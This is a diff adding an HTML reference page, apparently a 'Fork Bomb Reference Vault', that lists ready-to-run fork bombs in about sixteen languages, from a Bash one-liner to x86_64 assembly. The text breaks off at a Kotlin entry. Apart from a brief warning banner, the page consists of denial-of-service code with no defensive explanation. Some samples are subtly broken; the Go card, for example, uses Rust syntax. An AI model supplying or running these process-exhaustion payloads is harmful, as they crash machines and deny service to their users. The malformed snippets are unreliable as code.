@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fork Bomb Reference Vault</title>
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --text-color: #c9d1d9;
+            --accent-color: #ff7b72;
+            --border-color: #30363d;
+            --code-bg: #010409;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            padding: 2rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+            background: linear-gradient(180deg, #1f242c 0%, var(--bg-color) 100%);
+        }
+        h1 {
+            color: var(--accent-color);
+            margin: 0 0 0.5rem 0;
+            font-size: 2.5rem;
+        }
+        .warning {
+            background-color: rgba(248, 81, 73, 0.1);
+            border: 1px solid rgba(248, 81, 73, 0.4);
+            color: #ff7b72;
+            padding: 1rem;
+            border-radius: 6px;
+            max-width: 800px;
+            margin: 1.5rem auto;
+            text-align: left;
+            font-size: 0.9rem;
+        }
+        main {
+            max-width: 1400px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            gap: 1.5rem;
+        }
+        .card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+        }
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        .lang-title {
+            font-size: 1.25rem;
+            font-weight: bold;
+            color: #f0f6fc;
+            margin: 0;
+        }
+        .tag {
+            font-size: 0.75rem;
+            background-color: #21262d;
+            padding: 0.2rem 0.6rem;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+        pre {
+            background-color: var(--code-bg);
+            padding: 1rem;
+            border-radius: 6px;
+            overflow-x: auto;
+            border: 1px solid var(--border-color);
+            margin: 0;
+            font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
+            font-size: 0.85rem;
+            flex-grow: 1;
+            white-space: pre;
+        }
+        code {
+            color: #79c0ff;
+        }
+        footer {
+            text-align: center;
+            padding: 2rem;
+            margin-top: 4rem;
+            border-top: 1px solid var(--border-color);
+            font-size: 0.85rem;
+            color: #8b949e;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Fork Bomb Reference Vault</h1>
+        <p>An educational compendium of resource-exhausting loops across 22 environments.</p>
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> Fork bombs exhaust OS process limits and system resources. This dashboard is provided strictly as a cybersecurity reference to understand denial-of-service vulnerabilities. Do not run these on systems you do not own or have permission to crash.
+        </div>
+    </header>
+    <main>
+        <div class="grid">
+            <!-- Bash -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Bash / Sh</h2>
+                    <span class="tag">Shell</span>
+                </div>
+                <pre><code>:(){ :|:& };:</code></pre>
+            </div>
+
+            <!-- C -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">C</h2>
+                    <span class="tag">Systems</span>
+                </div>
+                <pre><code>#include &lt;unistd.h&gt;
+
+int main() {
+    while(1) {
+        fork();
+    }
+    return 0;
+}</code></pre>
+            </div>
+
+            <!-- C++ -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">C++</h2>
+                    <span class="tag">Systems</span>
+                </div>
+                <pre><code>#include &lt;unistd.h&gt;
+
+int main() {
+    for(;;) {
+        fork();
+    }
+}</code></pre>
+            </div>
+
+            <!-- Python -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Python</h2>
+                    <span class="tag">Scripting</span>
+                </div>
+                <pre><code>import os
+
+while True:
+    os.fork()</code></pre>
+            </div>
+
+            <!-- Windows Batch -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Windows Batch (.bat)</h2>
+                    <span class="tag">Windows</span>
+                </div>
+                <pre><code>:bomb
+start %0
+goto bomb</code></pre>
+            </div>
+
+            <!-- PowerShell -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">PowerShell</h2>
+                    <span class="tag">Windows</span>
+                </div>
+                <pre><code>while ($true) {
+    Start-Job -ScriptBlock { & $MyInvocation.MyCommand.Definition }
+}</code></pre>
+            </div>
+
+            <!-- Node.js -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Node.js</h2>
+                    <span class="tag">JavaScript</span>
+                </div>
+                <pre><code>const cluster = require('cluster');
+
+if (cluster.isMaster) {
+    while (true) {
+        cluster.fork();
+    }
+}</code></pre>
+            </div>
+
+            <!-- Java -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Java</h2>
+                    <span class="tag">Object Oriented</span>
+                </div>
+                <pre><code>public class ForkBomb {
+    public static void main(String[] args) {
+        while(true) {
+            Runtime.getRuntime().exec(
+                new String[]{"java", "-cp", System.getProperty("java.class.path"), "ForkBomb"}
+            );
+        }
+    }
+}</code></pre>
+            </div>
+
+            <!-- Rust -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Rust</h2>
+                    <span class="tag">Systems</span>
+                </div>
+                <pre><code>use std::process::Command;
+
+fn main() {
+    loop {
+        let _ = Command::new(std::env::current_exe().unwrap()).spawn();
+    }
+}</code></pre>
+            </div>
+
+            <!-- Go -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Go</h2>
+                    <span class="tag">Systems</span>
+                </div>
+                <pre><code>package main
+
+import "os/exec"
+import "os"
+
+fn main() {
+    for {
+        cmd := exec.Command(os.Args)
+        cmd.Start()
+    }
+}</code></pre>
+            </div>
+
+            <!-- Ruby -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Ruby</h2>
+                    <span class="tag">Scripting</span>
+                </div>
+                <pre><code>loop { fork }</code></pre>
+            </div>
+
+            <!-- Perl -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Perl</h2>
+                    <span class="tag">Scripting</span>
+                </div>
+                <pre><code>fork while fork;</code></pre>
+            </div>
+
+            <!-- PHP -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">PHP</h2>
+                    <span class="tag">Backend</span>
+                </div>
+                <pre><code>&lt;?php
+while (true) {
+    pcntl_fork();
+}
+?&gt;</code></pre>
+            </div>
+
+            <!-- Swift -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Swift (Unix)</h2>
+                    <span class="tag">Apple/Linux</span>
+                </div>
+                <pre><code>import Foundation
+
+while true {
+    fork()
+}</code></pre>
+            </div>
+
+            <!-- Assembly -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Assembly (x86_64 Linux)</h2>
+                    <span class="tag">Low Level</span>
+                </div>
+                <pre><code>section .text
+global _start
+
+_start:
+    mov rax, 57 ; sys_fork
+    syscall
+    jmp _start</code></pre>
+            </div>
+
+            <!-- Haskell -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="lang-title">Haskell</h2>
+                    <span class="tag">Functional</span>
+                </div>
+                <pre><code>import System.Posix.Process
+import Control.Monad
+
+bomb = forever $ forkProcess bomb</code></pre>
+            </div>
+
+            <!-- Kotlin -->
+            <div class="card">
+                <div class="card-header">
